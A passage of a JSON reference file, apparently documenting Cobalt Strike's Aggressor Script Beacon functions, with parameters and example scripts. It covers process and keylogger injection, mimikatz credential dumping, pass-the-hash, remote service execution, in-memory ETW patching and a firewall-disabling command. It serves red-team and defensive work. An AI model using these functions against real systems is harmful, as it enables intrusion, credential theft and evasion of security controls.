    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the process to inject the session into"
      },
      {
        "param": "$3",
        "desc": "the listener to target."
      },
      {
        "param": "$4",
        "desc": "the process architecture (x86 | x64)"
      }
    ],
    "returns": "",
    "example": "binject($1, 1234, \"my-listener\");",
    "notes": "",
    "signature": "binject",
    "anchors": [
      "binject"
    ]
  },
  "binline_execute": {
    "description": "Execute a Beacon Object File. This is the same as using the inline-execute command in Beacon.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the Beacon"
      },
      {
        "param": "$2",
        "desc": "the path to the BOF file"
      },
      {
        "param": "$3",
        "desc": "the string argument to pass to the BOF file"
      },
      {
        "param": "$4",
        "desc": "(optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "This functions follows the behavior of *inline-execute* in the Beacon console. The string argument will be zero-terminated, converted to the target encoding, and passed as an argument to the BOF's go function. To execute a BOF, with more control, use &beacon_inline_execute\n\nThe Cobalt Strike documentation has a page specific to BOF files. See Beacon Object Files.",
    "signature": "binline_execute",
    "anchors": [
      "binline_execute"
    ]
  },
  "binput": {
    "description": "Report a command was run to the Beacon console and logs. Scripts that execute commands for the user (e.g., events, popup menus) should use this function to assure operator attribution of automated actions in Beacon's logs.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon to post to"
      },
      {
        "param": "$2",
        "desc": "the text to post"
      }
    ],
    "returns": "",
    "example": "# indicate the user ran the ls command\nbinput($1, \"ls\");",
    "notes": "",
    "signature": "binput",
    "anchors": [
      "binput"
    ]
  },
  "bipconfig": {
    "description": "Task a Beacon to list network interfaces.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "callback function with the ipconfig results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map"
      }
    ],
    "returns": "",
    "example": "alias ipconfig {\nbipconfig($1, {\nblog($1, \"Network information is:\\n $+ $2\");\n});\n}",
    "notes": "",
    "signature": "bipconfig",
    "anchors": [
      "bipconfig"
    ]
  },
  "bjoberror": {
    "description": "Publishes a job error message to the Beacon transcript. Its primary purpose is to be used in the post-execution job's callback function.\n\nArguments:\n\n$1 - the id for the beacon to post to.\n\n$2 - the related job id.\n\n$3 - the test to post.\n\nExample:\nbeacon_execute_postex_job($bid, $null, $dll_content, $args, {\nlocal('$bid $result %info $type');\n($bid, $result, %info) = @_;\n$type = %info[\"type\"] ;\n$jid = %info[\"jid\"] ;\nif ($type eq \"error\") {\nbjoberror($bid, $jid, \"[postex-cb: $+ $type $+ ]: \" . $result);\n}\nelse {\nbjoblog($bid, $jid, \"[postex-cb: $+ $type $+ ]: \" . $result);\n}\n});",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "bjoberror",
    "anchors": [
      "bjoberror"
    ]
  },
  "bjobkill": {
    "description": "Ask Beacon to kill a running post-exploitation job.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the job ID."
      }
    ],
    "returns": "",
    "example": "bjobkill($1, 0);",
    "notes": "",
    "signature": "bjobkill",
    "anchors": [
      "bjobkill"
    ]
  },
  "bjoblog": {
    "description": "Publishes a job output message to the Beacon transcript. Its primary purpose is to be used in the post-execution job's callback function.\n\nArguments:\n\n$1 - the id for the beacon to post to.\n\n$2 - the related job id.\n\n$3 - the test to post.\n\nExample:\nbeacon_execute_postex_job($bid, $null, $dll_content, $args, {\nlocal('$bid $result %info $type');\n($bid, $result, %info) = @_;\n$type = %info[\"type\"] ;\n$jid = %info[\"jid\"] ;\nif ($type eq \"error\") {\nbjoberror($bid, $jid, \"[postex-cb: $+ $type $+ ]: \" . $result);\n}\nelse {\nbjoblog($bid, $jid, \"[postex-cb: $+ $type $+ ]: \" . $result);\n}\n});",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "bjoblog",
    "anchors": [
      "bjoblog"
    ]
  },
  "bjobs": {
    "description": "Ask Beacon to list running post-exploitation jobs.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "bjobs($1);",
    "notes": "",
    "signature": "bjobs",
    "anchors": [
      "bjobs"
    ]
  },
  "bjob_send_data": {
    "description": "Sends data to the DLL over the named pipe. \n\nNOTE: The Postex Kit DLL must read any data on the pipe before Beacon can write any additional data to it. See Bi-Directional Comms and Callbacks for examples.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon id"
      },
      {
        "param": "$2",
        "desc": "the Job id"
      },
      {
        "param": "$3",
        "desc": "the data to send"
      }
    ],
    "returns": "",
    "example": "bjob_send_data($beacon_id, $job_id, $data);",
    "notes": "",
    "signature": "bjob_send_data",
    "anchors": [
      "bjob_send_data"
    ]
  },
  "bjump": {
    "description": "Ask Beacon to spawn a session on a remote target.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the technique to use"
      },
      {
        "param": "$3",
        "desc": "the remote target"
      },
      {
        "param": "$4",
        "desc": "the listener to spawn"
      }
    ],
    "returns": "",
    "example": "# winrm [target] [listener]\nalias winrm {\nbjump($1, \"winrm\", $2, $3);\n}\n\nSee also\n\n&beacon_remote_exploit_describe, &beacon_remote_exploit_register, &beacon_remote_exploits",
    "notes": "",
    "signature": "bjump",
    "anchors": [
      "bjump"
    ]
  },
  "bkerberos_ccache_use": {
    "description": "Ask beacon to inject a UNIX kerberos ccache file into the user's kerberos tray",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the local path the ccache file"
      }
    ],
    "returns": "",
    "example": "alias kerberos_ccache_use {\nbkerberos_ccache_use($1, $2);\n}",
    "notes": "",
    "signature": "bkerberos_ccache_use",
    "anchors": [
      "bkerberos_ccache_use"
    ]
  },
  "bkerberos_ticket_purge": {
    "description": "Ask beacon to purge tickets from the user's kerberos tray",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "alias kerberos_ticket_purge {\nbkerberos_ticket_purge($1);\n}",
    "notes": "",
    "signature": "bkerberos_ticket_purge",
    "anchors": [
      "bkerberos_ticket_purge"
    ]
  },
  "bkerberos_ticket_use": {
    "description": "Ask beacon to inject a mimikatz kirbi file into the user's kerberos tray",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the local path the kirbi file"
      }
    ],
    "returns": "",
    "example": "alias kerberos_ticket_use {\nbkerberos_ticket_use($1, $2);\n}",
    "notes": "",
    "signature": "bkerberos_ticket_use",
    "anchors": [
      "bkerberos_ticket_use"
    ]
  },
  "bkeylogger": {
    "description": "Injects a keystroke logger into a process.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "(optional) the PID to inject the keystroke logger into or $null."
      },
      {
        "param": "$3",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null."
      }
    ],
    "returns": "",
    "example": "Spawn a temporary process\nbkeylogger($1);\n\nInject into the specified process\nbkeylogger($1, 1234, \"x64\");",
    "notes": "",
    "signature": "bkeylogger",
    "anchors": [
      "bkeylogger"
    ]
  },
  "bkill": {
    "description": "Ask Beacon to kill a process",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the PID to kill"
      }
    ],
    "returns": "",
    "example": "bkill($1, 1234);",
    "notes": "",
    "signature": "bkill",
    "anchors": [
      "bkill"
    ]
  },
  "blink": {
    "description": "Ask Beacon to link to a host over a named pipe",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the target to link to"
      },
      {
        "param": "$3",
        "desc": "(optional) the pipename to use. The default pipename in the Malleable C2 profile is the default otherwise."
      }
    ],
    "returns": "",
    "example": "blink($1, \"DC\");",
    "notes": "Use &beacon_link if you want a script function that will connect or link based on a listener configuration.",
    "signature": "blink",
    "anchors": [
      "blink"
    ]
  },
  "blog": {
    "description": "Publishes an output message to the Beacon transcript.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon to post to"
      },
      {
        "param": "$2",
        "desc": "the text to post"
      }
    ],
    "returns": "",
    "example": "alias demo {\nblog($1, \"I am output for the blog function\");\n}",
    "notes": "",
    "signature": "blog",
    "anchors": [
      "blog"
    ]
  },
  "blog2": {
    "description": "Publishes an output message to the Beacon transcript. This function has an alternate format from &blog",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon to post to"
      },
      {
        "param": "$2",
        "desc": "the text to post"
      }
    ],
    "returns": "",
    "example": "alias demo2 {\nblog2($1, \"I am output for the blog2 function\");\n}",
    "notes": "",
    "signature": "blog2",
    "anchors": [
      "blog2"
    ]
  },
  "bloginuser": {
    "description": "Ask Beacon to create a token from the specified credentials. This is the make_token command. User principle name (UPN) formatting may be used for the username value. In this case, the user's domain value is ignored.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the domain of the user"
      },
      {
        "param": "$3",
        "desc": "the user's username"
      },
      {
        "param": "$4",
        "desc": "the user's password"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "bloginuser",
    "anchors": [
      "bloginuser"
    ]
  },
  "blogonpasswords": {
    "description": "Ask Beacon to dump in-memory credentials with mimikatz. This function requires administrator privileges.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "(optional) the PID to inject the logonpasswords command into or $null"
      },
      {
        "param": "$3",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null"
      }
    ],
    "returns": "",
    "example": "Spawn a temporary process\nitem \"Dump &Passwords\" {\nbinput($1, \"logonpasswords\");\nblogonpasswords($1);\n}\n\nInject into the specified process\nbeacon_command_register(\n\"logonpasswords_inject\",\n\"Inject into a process and dump in-memory credentials with mimikatz\",\n\"Usage: logonpasswords_inject [pid] [arch]\");\n\nalias logonpasswords_inject {\nblogonpasswords($1, $2, $3);\n}",
    "notes": "",
    "signature": "blogonpasswords",
    "anchors": [
      "blogonpasswords"
    ]
  },
  "bls": {
    "description": "Task a Beacon to list files\n\nVariations\nbls($1, \"folder\");\n\nOutput the results to the Beacon console.\n\nbls($1, \"folder\", &callback);\n\nRoute results to the specified callback function.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "(optional) the folder to list files for. Use \".\" for the current folder."
      },
      {
        "param": "$3",
        "desc": "(optional) callback function with the ls results. Arguments to the callback are: $1 = beacon ID, $2 = the folder, $3 = results"
      }
    ],
    "returns": "",
    "example": "on beacon_initial {\nbls($1, \".\");\n}",
    "notes": "",
    "signature": "bls",
    "anchors": [
      "bls"
    ]
  },
  "bmimikatz": {
    "description": "Ask Beacon to run a mimikatz command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the command and arguments to run. Supports the semicolon ( ; ) character to separate multiple commands"
      },
      {
        "param": "$3",
        "desc": "(optional) the PID to inject the mimikatz command into or $null"
      },
      {
        "param": "$4",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null"
      },
      {
        "param": "$5",
        "desc": "(optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "bmimikatz",
    "anchors": [
      "bmimikatz"
    ]
  },
  "bmimikatz_small": {
    "description": "Use Cobalt Strike's \"smaller\" internal build of Mimikatz to execute a mimikatz command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the command and arguments to run. Supports the semicolon ( ; ) character to separate multiple commands"
      },
      {
        "param": "$3",
        "desc": "(optional) the PID to inject the mimikatz command into or $null"
      },
      {
        "param": "$4",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null"
      },
      {
        "param": "$5",
        "desc": "(optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map"
      }
    ],
    "returns": "",
    "example": "# Usage: logonpasswords_elevate [pid] [arch]\nalias logonpasswords_elevate {\nif ($2 >= 0 && ($3 eq \"x86\" || $3 eq \"x64\")) {\nbmimikatz_small($1, \"!sekurlsa::logonpasswords\", $2, $3);\n} else {\nbmimikatz_small($1, \"!sekurlsa::logonpasswords\");\n}\n}",
    "notes": "This mimikatz build supports:\n\n* kerberos::golden\n* lsadump::dcsync\n* sekurlsa::logonpasswords\n* sekurlsa::pth\n\nAll of the other stuff is removed for size. Use &bmimikatz if you want to bring the full power of mimikatz to some other offense problem.",
    "signature": "bmimikatz_small",
    "anchors": [
      "bmimikatz_small"
    ]
  },
  "bmkdir": {
    "description": "Ask Beacon to make a directory",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the folder to create"
      }
    ],
    "returns": "",
    "example": "bmkdir($1, \"you are owned\");",
    "notes": "",
    "signature": "bmkdir",
    "anchors": [
      "bmkdir"
    ]
  },
  "bmode": {
    "description": "Change the data channel for a DNS Beacon.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the data channel (e.g., dns, dns6, or dns-txt)"
      }
    ],
    "returns": "",
    "example": "item \"Mode DNS-TXT\" {\nbinput($1, \"mode dns-txt\");\nbmode($1, \"dns-txt\");\n}",
    "notes": "",
    "signature": "bmode",
    "anchors": [
      "bmode"
    ]
  },
  "bmv": {
    "description": "Ask Beacon to move a file or folder.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the file or folder to move"
      },
      {
        "param": "$3",
        "desc": "the destination"
      }
    ],
    "returns": "",
    "example": "bmv($1, \"evil.exe\", \"\\\\\\\\target\\\\\\C$\\\\evil.exe\");",
    "notes": "",
    "signature": "bmv",
    "anchors": [
      "bmv"
    ]
  },
  "bnet": {
    "description": "Run a command from Beacon's network and host enumeration tool.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the command to run."
      },
      {
        "param": "$3",
        "desc": "the target to run this command against or $null"
      },
      {
        "param": "$4",
        "desc": "the parameter to this command (e.g., a group name)"
      },
      {
        "param": "$5",
        "desc": "(optional) the PID to inject the network and host enumeration tool into or $null"
      },
      {
        "param": "$6",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null"
      },
      {
        "param": "$7",
        "desc": "(optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "bnet",
    "anchors": [
      "bnet"
    ]
  },
  "bnote": {
    "description": "Assign a note to the specified Beacon.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon to post to"
      },
      {
        "param": "$2",
        "desc": "the note content"
      }
    ],
    "returns": "",
    "example": "bnote($1, \"foo\");",
    "notes": "",
    "signature": "bnote",
    "anchors": [
      "bnote"
    ]
  },
  "bof_extract": {
    "description": "The function extracts the executable code for the specified entry point from the Beacon Object File (BOF) and is typically used in conjunction with the BEACON_SLEEP_MASK hook.",
    "arguments": [
      {
        "param": "$1",
        "desc": "A string containing the beacon object file."
      },
      {
        "param": "$2",
        "desc": "Entry point of the code to extract. The default is \"sleep_mask\""
      }
    ],
    "returns": "The extracted BOF.",
    "example": "set BEACON_SLEEP_MASK {\nlocal('$beacon_type $arch $type $handle $data $bof $bof_len');\n($beacon_type, $arch) = @_;\n$type = \"\";\nif ($beacon_type ne \"default\") {\n$type = \"_ $+ $beacon_type\";\n}\n\n$handle = openf(script_resource(\"sleepmask $+ $type $+ . $+ $arch $+ .o\"));\n$data = readb($handle, -1);\nclosef($handle);\n\n$bof = bof_extract($data, \"sleep_mask\");\n$bof_len = strlen($bof);\n\nif ($bof_len <= 0) {\nreturn %(status => 0, result => $null, error => \"Error: failed to extract the sleepmask BOF.\");\n}\nreturn %(status => 1, result => $bof, information => \"Sleepmask BOF generated. Total size: $bof_len\");\n}",
    "notes": "",
    "signature": "bof_extract",
    "anchors": [
      "bof_extract"
    ]
  },
  "bof_pack": {
    "description": "Pack arguments in a way that's suitable for BOF APIs to unpack.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the Beacon (needed for unicode conversions)"
      },
      {
        "param": "$2",
        "desc": "format string for the packed data"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "This function packs its arguments into a binary structure for use with &beacon_inline_execute. The format string options here correspond to the BeaconData* C API available to BOF files. This API handles transformations on the data and hints as required by each type it can pack.\n\nType\nDescription\nUnpack With (C)\n\nb\nbinary data\nBeaconDataExtract\n\ni\n4-byte integer\nBeaconDataInt\n\ns\n2-byte short integer\nBeaconDataShort\n\nz\nzero-terminated+encoded string\nBeaconDataExtract\n\nZ\nzero-terminated wide-char string\n(wchar_t *)BeaconDataExtract\n\nThe Cobalt Strike documentation has a page specific to BOF files. See Beacon Object Files.\n\nSee also\n\n&beacon_inline_execute",
    "signature": "bof_pack",
    "anchors": [
      "bof_pack"
    ]
  },
  "bpassthehash": {
    "description": "Ask Beacon to create a token that passes the specified hash. This is the pth command in Beacon. It uses mimikatz. This function requires administrator privileges.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the domain of the user"
      },
      {
        "param": "$3",
        "desc": "the user's username"
      },
      {
        "param": "$4",
        "desc": "the user's password hash"
      },
      {
        "param": "$5",
        "desc": "(optional) the PID to inject the pth command into or $null"
      },
      {
        "param": "$6",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null"
      }
    ],
    "returns": "",
    "example": "Spawn a temporary process\nbpassthehash($1, \"CORP\", \"Administrator\", \"password_hash\");\n\nInject into the specified process\nbpassthehash($1, \"CORP\", \"Administrator\", \"password_hash\", 1234, \"x64\");",
    "notes": "",
    "signature": "bpassthehash",
    "anchors": [
      "bpassthehash"
    ]
  },
  "bpause": {
    "description": "Ask Beacon to pause its execution. This is a one-off sleep.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "how long the Beacon should pause execution for (milliseconds)"
      }
    ],
    "returns": "",
    "example": "alias pause {\nbpause($1, int($2));\n}",
    "notes": "",
    "signature": "bpause",
    "anchors": [
      "bpause"
    ]
  },
  "bportscan": {
    "description": "Ask Beacon to run its port scanner.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the targets to scan (e.g., 192.168.12.0/24)"
      },
      {
        "param": "$3",
        "desc": "the ports to scan (e.g., 1-1024,6667)"
      },
      {
        "param": "$4",
        "desc": "the discovery method to use (arp|icmp|none)"
      },
      {
        "param": "$5",
        "desc": "the max number of sockets to use (e.g., 1024)"
      },
      {
        "param": "$6",
        "desc": "(optional) the PID to inject the port scanner into or $null"
      },
      {
        "param": "$7",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null"
      },
      {
        "param": "$8",
        "desc": "(optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map"
      }
    ],
    "returns": "",
    "example": "Spawn a temporary process\nbportscan($1, \"192.168.12.0/24\", \"1-1024,6667\", \"arp\", 1024);\n\nInject into the specified process\nbportscan($1, \"192.168.12.0/24\", \"1-1024,6667\", \"arp\", 1024, 1234, \"x64\");",
    "notes": "",
    "signature": "bportscan",
    "anchors": [
      "bportscan"
    ]
  },
  "bpowerpick": {
    "description": "Spawn a process, inject Unmanaged PowerShell, and run the specified command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the cmdlet and arguments"
      },
      {
        "param": "$3",
        "desc": "(optional) if specified, powershell-import script is ignored and this argument is treated as the download cradle to prepend to the command. Empty string is OK here too, for no download cradle. Specify $null to use the current imported PowerShell script."
      },
      {
        "param": "$4",
        "desc": "(optional) the \"PATCHES:\" argument can modify functions in memory for the process. Up to 4 \"patch-rule\" rules can be specified (space delimited)."
      },
      {
        "param": "$5",
        "desc": "(optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map"
      }
    ],
    "returns": "",
    "example": "# get the version of PowerShell available via Unmanaged PowerShell\nalias powerver {\nbpowerpick($1, '$PSVersionTable.PSVersion');\n}\n\nalias powerver2 {\nbpowerpick($1, '$PSVersionTable.PSVersion', '', 'PATCHES: ntdll.dll,EtwEventWrite,0,C300');\n}",
    "notes": "",
    "signature": "bpowerpick",
    "anchors": [
      "bpowerpick"
    ]
  },
  "bpowershell": {
    "description": "Ask Beacon to run a PowerShell cmdlet",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the cmdlet and arguments"
      },
      {
        "param": "$3",
        "desc": "(optional) if specified, powershell-import script is ignored and this argument is treated as the download cradle to prepend to the command. Empty string is OK here too, for no download cradle. Specify $null to use the current imported PowerShell script."
      },
      {
        "param": "$4",
        "desc": "(optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map"
      }
    ],
    "returns": "",
    "example": "# get the version of PowerShell...\nalias powerver {\nbpowershell($1, '$PSVersionTable.PSVersion');\n}",
    "notes": "",
    "signature": "bpowershell",
    "anchors": [
      "bpowershell"
    ]
  },
  "bpowershell_import": {
    "description": "Import a PowerShell script into a Beacon",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the path to the local file to import"
      }
    ],
    "returns": "",
    "example": "# quickly run PowerUp\nalias powerup {\nbpowershell_import($1, script_resource(\"PowerUp.ps1\"));\nbpowershell($1, \"Invoke-AllChecks\");\n}",
    "notes": "",
    "signature": "bpowershell_import",
    "anchors": [
      "bpowershell_import"
    ]
  },
  "bpowershell_import_clear": {
    "description": "Clear the imported PowerShell script from a Beacon session.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "alias powershell-clear {\nbpowershell_import_clear($1);\n}",
    "notes": "",
    "signature": "bpowershell_import_clear",
    "anchors": [
      "bpowershell_import_clear"
    ]
  },
  "bppid": {
    "description": "Set a parent process for Beacon's child processes",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the parent process ID. Specify 0 to reset to default behavior."
      }
    ],
    "returns": "",
    "example": "alias prepenv {\nbtask($1, \"Tasked Beacon to find explorer.exe and make it the PPID\");\nbps($1, {\nlocal('$pid $name $entry');\nforeach $entry (split(\"\\n\", $2)) {\n($name, $null, $pid) = split(\"\\\\s+\", $entry);\nif ($name eq \"explorer.exe\") {\nbppid($1, $pid);\n}\n}\n});\n}",
    "notes": "- The current session must have rights to access the specified parent process. \n\n- Attempts to spawn post-ex jobs under parent processes in another desktop session may fail. This limitation is due to how Beacon launches its \"temporary\" processes for post-exploitation jobs and injects code into them.",
    "signature": "bppid",
    "anchors": [
      "bppid"
    ]
  },
  "bprintscreen": {
    "description": "Ask Beacon to take a screenshot via PrintScr method.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "(optional) the PID to inject the screenshot tool via PrintScr method or $null."
      },
      {
        "param": "$3",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null."
      }
    ],
    "returns": "",
    "example": "Spawn a temporary process\nitem \"&Printscreen\" {\nbinput($1, \"printscreen\");\nbpintscreen($1);\n}\n\nInject into the specified process\nbprintscreen($1, 1234, \"x64\");",
    "notes": "",
    "signature": "bprintscreen",
    "anchors": [
      "bprintscreen"
    ]
  },
  "bps": {
    "description": "Task a Beacon to list processes\n\nVariations\nbps($1);\n\nOutput the results to the Beacon console.\n\nbps($1, &callback);\n\nRoute results to the specified callback function.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "(optional) callback function with the ps results. Arguments to the callback are: $1 = beacon ID, $2 = results"
      }
    ],
    "returns": "",
    "example": "on beacon_initial {\nbps($1);\n}\n\nalias prepenv {\nbtask($1, \"Tasked Beacon to find explorer.exe and make it the PPID\");\nbps($1, {\nlocal('$pid $name $entry');\nforeach $entry (split(\"\\n\", $2)) {\n($name, $null, $pid) = split(\"\\\\s+\", $entry);\nif ($name eq \"explorer.exe\") {\nbppid($1, $pid);\n}\n}\n});\n}",
    "notes": "",
    "signature": "bps",
    "anchors": [
      "bps"
    ]
  },
  "bpsexec": {
    "description": "Ask Beacon to spawn a payload on a remote host. This function generates an Artifact Kit executable, copies it to the target, and creates a service to run it and clean it up.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the target to spawn a payload onto"
      },
      {
        "param": "$3",
        "desc": "the listener to spawn"
      },
      {
        "param": "$4",
        "desc": "the share to copy the executable to"
      },
      {
        "param": "$5",
        "desc": "the architecture of the payload to generate/deliver (x86 or x64)"
      }
    ],
    "returns": "",
    "example": "brev2self();\nbloginuser($1, \"CORP\", \"Administrator\", \"toor\");\nbpsexec($1, \"172.16.48.3\", \"my-listener\", \"ADMIN\\$\");",
    "notes": "",
    "signature": "bpsexec",
    "anchors": [
      "bpsexec"
    ]
  },
  "bpsexec_command": {
    "description": "Ask Beacon to run a command on a remote host. This function creates a service on the remote host, starts it, and cleans it up.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the target to run the command on"
      },
      {
        "param": "$3",
        "desc": "the name of the service to create"
      },
      {
        "param": "$4",
        "desc": "the command to run."
      }
    ],
    "returns": "",
    "example": "# disable the firewall on a remote target\n# beacon> shieldsdown [target]\nalias shieldsdown {\nbpsexec_command($1, $2, \"shieldsdn\", \"cmd.exe /c netsh advfirewall set allprofiles state off\");\n}",
    "notes": "",
    "signature": "bpsexec_command",
    "anchors": [
      "bpsexec_command"
    ]
  },
  "bpsexec_psh": {
    "description": "REMOVED Removed in Cobalt Strike 4.0. Use &bjump with psexec_psh option.",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "bpsexec_psh",
    "anchors": [
      "bpsexec_psh"
    ]
  },
  "bpsinject": {
    "description": "Inject Unmanaged PowerShell into a specific process and run the specified cmdlet. This will use the current imported powershell script.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the process to inject the session into"
      },
      {
        "param": "$3",
        "desc": "the process architecture (x86 | x64)"
      },
      {
        "param": "$4",
        "desc": "the cmdlet to run"
      },
      {
        "param": "$5",
        "desc": "(optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map"
      }
    ],
    "returns": "",
    "example": "bpsinject($1, 1234, x64, \"[System.Diagnostics.Process]::GetCurrentProcess()\");",
    "notes": "",
    "signature": "bpsinject",
    "anchors": [
      "bpsinject"
    ]
  },
  "bpwd": {
    "description": "Ask Beacon to print its current working directory",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "alias pwd {\nbpwd($1);\n}",
    "notes": "",
    "signature": "bpwd",
    "anchors": [
      "bpwd"
    ]
  },
  "bread_pipe": {
    "description": "bread_pipe is called to register a new user-defined post-ex Beacon job which communicates over a named pipe.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon id"
      },
      {
        "param": "$2",
        "desc": "the job type (ANONYMOUS_BYTESTREAM, ANONYMOUS_BLOB, or IMPERSONATE_BYTESTREAM)"
      },
      {
        "param": "$3",
        "desc": "the callback type (CALLBACK_POSTEX_KIT, CALLBACK_OUTPUT, CALLBACK_OUTPUT_UTF8, or CALLBACK_OUTPUT_OEM)."
      },
      {
        "param": "$4",
        "desc": "the job description"
      },
      {
        "param": "$5",
        "desc": "the name of the named pipe Beacon must connect to for communication"
      },
      {
        "param": "$6",
        "desc": "the pid (set to 0)"
      },
      {
        "param": "$7",
        "desc": "the timeout value in milliseconds"
      },
      {
        "param": "$8",
        "desc": "an optional aggressor script closure (can be set to $null)"
      }
    ],
    "returns": "",
    "example": "bread_pipe($bid, \"ANONYMOUS_BYTESTREAM\", \"CALLBACK_POSTEX_KIT\", \"bof.x64.o\", \"msrpc_1234\", 0, 10000, $null);",
    "notes": "",
    "signature": "bread_pipe",
    "anchors": [
      "bread_pipe"
    ]
  },
  "breg_queryv": {
    "description": "Ask Beacon to query a value within a registry key.",
    "arguments": [
      {
        "param": "$1",
